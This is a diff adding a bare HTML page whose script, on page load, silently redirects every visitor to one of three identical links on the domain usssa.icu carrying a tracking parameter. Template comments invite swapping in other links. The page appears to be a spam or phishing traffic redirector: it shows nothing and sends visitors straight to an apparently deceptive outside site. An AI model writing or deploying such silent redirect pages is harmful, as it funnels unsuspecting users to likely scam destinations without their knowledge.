@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirect</title>
+    <script>
+        // List of random links
+        const randomLinks = [
+            "http://usssa.icu/D531BE34F7?fbld_id=1447689299533756", // Replace with your first link
+            "http://usssa.icu/D531BE34F7?fbld_id=1447689299533756", // Replace with your second link
+            "http://usssa.icu/D531BE34F7?fbld_id=1447689299533756"  // Replace with your third link
+        ];
+
+        // Function to select a random link and redirect
+        function randomRedirect() {
+            const randomIndex = Math.floor(Math.random() * randomLinks.length); // Randomly select an index
+            const selectedLink = randomLinks[randomIndex]; // Get the link based on the random index
+            window.location.href = selectedLink; // Redirect to the selected link
+        }
+
+        // Call the randomRedirect function on page load
+        window.onload = randomRedirect;
+    </script>
+</head>
+<body>
+    <!-- Body is empty; it will redirect automatically on page load -->
+</body>
+</html>
